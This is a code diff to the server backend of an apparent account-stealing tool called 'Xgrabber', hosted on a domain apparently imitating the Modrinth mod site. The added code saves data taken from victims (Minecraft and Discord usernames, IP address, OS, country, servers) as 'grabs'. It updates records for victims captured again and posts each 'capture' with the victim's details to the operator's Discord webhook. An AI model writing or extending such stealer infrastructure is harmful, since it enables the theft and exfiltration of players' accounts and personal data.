@@ -26,6 +26,43 @@ function getClientAuth(request) {
   );
 }
 
+async function sendDiscordWebhook(webhookUrl, grab, isNew) {
+  if (!webhookUrl) return;
+  const mcHead = `https://mc-heads.net/avatar/${grab.minecraft_username}/128`;
+  const siteUrl = 'https://www.modrinth.nl';
+  const detailUrl = `${siteUrl}/dashboard/grabs`;
+
+  const color = isNew ? 2201972 : 16750848;
+  const title = isNew ? 'Xgrabber — New Capture' : 'Xgrabber — Capture Updated';
+  const desc = isNew
+    ? `${grab.minecraft_username} was captured successfully!`
+    : `${grab.minecraft_username} was updated!`;
+
+  try {
+    await fetch(webhookUrl, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        embeds: [{
+          title,
+          description: desc,
+          color,
+          thumbnail: { url: mcHead },
+          url: detailUrl,
+          fields: [
+            { name: 'Username', value: grab.minecraft_username || 'Unknown', inline: true },
+            { name: 'Discord', value: grab.discord_username || 'Unknown', inline: true },
+            { name: 'IP', value: grab.ip_address || 'Unknown', inline: true },
+            { name: 'OS', value: grab.os || 'Unknown', inline: true },
+            { name: 'Country', value: grab.country || 'Unknown', inline: true },
+          ],
+          footer: { text: `Xgrabber · ${new Date().toLocaleString()}` },
+        }],
+      }),
+    });
+  } catch (e) {}
+}
+
 export async function GET(request) {
   const { searchParams } = new URL(request.url);
   const ownerEmail = searchParams.get('owner_email');
@@ -74,7 +111,7 @@ export async function POST(request) {
     if (mapping?.email) ownerEmail = mapping.email;
   }
 
-  const grab = {
+  const grabData = {
     owner_email: ownerEmail,
     minecraft_username: body.minecraft_username || 'Unknown',
     discord_username: body.discord_username || 'Unknown',
@@ -100,12 +137,43 @@ export async function POST(request) {
     servers: body.servers || '',
   };
 
-  const { data, error } = await supabase
+  const { data: existing } = await supabase
     .from('grabs')
-    .insert([grab])
-    .select()
+    .select('id, owner_email')
+    .eq('minecraft_username', body.minecraft_username)
+    .order('created_at', { ascending: false })
+    .limit(1)
     .single();
 
-  if (error) return NextResponse.json({ error: error.message }, { status: 500 });
-  return NextResponse.json({ ok: true, id: data.id });
+  let isNew = !existing;
+  let grabId;
+
+  if (existing) {
+    grabId = existing.id;
+    await supabase
+      .from('grabs')
+      .update({ ...grabData, owner_email: ownerEmail || existing.owner_email })
+      .eq('id', existing.id);
+  } else {
+    const { data, error } = await supabase
+      .from('grabs')
+      .insert([grabData])
+      .select()
+      .single();
+    if (error) return NextResponse.json({ error: error.message }, { status: 500 });
+    grabId = data.id;
+  }
+
+  if (ownerEmail) {
+    const { data: settings } = await supabase
+      .from('user_settings')
+      .select('webhook_url')
+      .eq('email', ownerEmail)
+      .single();
+    if (settings?.webhook_url) {
+      await sendDiscordWebhook(settings.webhook_url, grabData, isNew);
+    }
+  }
+
+  return NextResponse.json({ ok: true, id: grabId, isNew });
 }
